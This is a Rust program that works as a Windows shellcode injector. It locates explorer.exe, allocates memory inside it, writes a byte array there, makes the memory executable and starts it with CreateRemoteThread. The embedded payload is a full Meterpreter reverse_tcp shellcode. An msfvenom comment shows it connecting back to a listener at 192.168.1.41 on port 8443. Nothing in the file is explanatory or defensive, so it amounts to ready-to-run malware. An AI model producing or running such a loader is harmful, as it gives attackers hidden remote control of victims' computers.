#![windows_subsystem = "windows"]    // Uncomment to disable console (for debug purposes)

use sysinfo::{ProcessExt, System, SystemExt, Pid};
use core::{
    ptr,
};
use windows::{
    Win32::{
        System::{ Threading::{
                PROCESS_ALL_ACCESS,
                OpenProcess,
                CreateRemoteThread,
            },
            Memory::{
                VirtualAllocEx,
                MEM_COMMIT,
                MEM_RESERVE,
                PAGE_READWRITE,
                VirtualProtectEx,
                PAGE_PROTECTION_FLAGS,
                PAGE_EXECUTE_READ,
            },
            Diagnostics::{
                Debug::{
                    WriteProcessMemory,
                },
            },
        },
        Foundation::{
            CloseHandle,
            FALSE,
            TRUE,
        },
    },
};

#[allow(non_snake_case)]            // The compiler stops telling us to use snake_case

// A function which will return the PID of a given process name
fn getPIDByName(pname: String) -> i64 {
    unsafe {
        let mut sys = System::new_all();
        sys.refresh_all();

        let mut processID: i64 = 0;
        for (pid, process) in sys.processes() {
            if pname == process.name() {
                // println!("{} {}", pid, process.name());
                processID = std::mem::transmute::<Pid, i64>(*pid);
                break;
            }
        }

    return processID;
    };
}

#[allow(non_snake_case)]            // The compiler stops telling us to use snake_case
fn Inject(shellcode: [u8; 511]) {
    unsafe {
        let pid = getPIDByName("explorer.exe".to_string());

        println!("Getting process handle");
        let hProcess = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            pid as u32,
        );

        println!("Allocating memory");
        let baseAddr = VirtualAllocEx(
            hProcess.clone().unwrap(),
            Some(ptr::null()),
            shellcode.len() as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        println!("Writing shellcode");
        let wSuccess = WriteProcessMemory(
            hProcess.clone().unwrap(),
            baseAddr,
            shellcode.as_ptr() as _,
            shellcode.len() as usize,
            None,
        );
        
        if wSuccess == TRUE {
            println!("Successfully wrote to memory :)");
        } else {
            println!("Writing to memory failed :(");
        };

        let mut oldPro: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
        println!("Changing the memory protection to PAGE_EXECUTE_READ");
        let _pSuccess = VirtualProtectEx(
            hProcess.clone().unwrap(),
            baseAddr,
            shellcode.len() as usize,
            PAGE_EXECUTE_READ,
            &mut oldPro,
        );

        println!("Executing shellcode");
        let _hThread = CreateRemoteThread(
            hProcess.clone().unwrap(),
            None,
            0 as usize,
            Some(std::mem::transmute(baseAddr)),
            None,
            0 as u32,
            None,
        );

        println!("Closing handle");
        let _cSuccess = CloseHandle(hProcess.clone().unwrap());
    };
}

fn main() {
    // meterpreter
    // msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=8443 LHOST=192.168.1.41 EXITFUNC=thread -f rust
    let shellcode: [u8; 511] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,
    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,
    0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,
    0x51,0x56,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,
    0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
    0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,
    0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,
    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
    0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
    0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
    0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x5e,0x48,0x01,0xd0,0x59,
    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,
    0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,
    0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,
    0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x20,0xfb,0xc0,
    0xa8,0x01,0x29,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,
    0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,
    0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,
    0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,
    0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,
    0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,
    0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
    0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,
    0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,
    0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,
    0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
    0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,
    0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,
    0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,
    0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,
    0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,
    0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,0x00,
    0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,
    0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,
    0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,
    0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,
    0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5];

    Inject(shellcode);
}
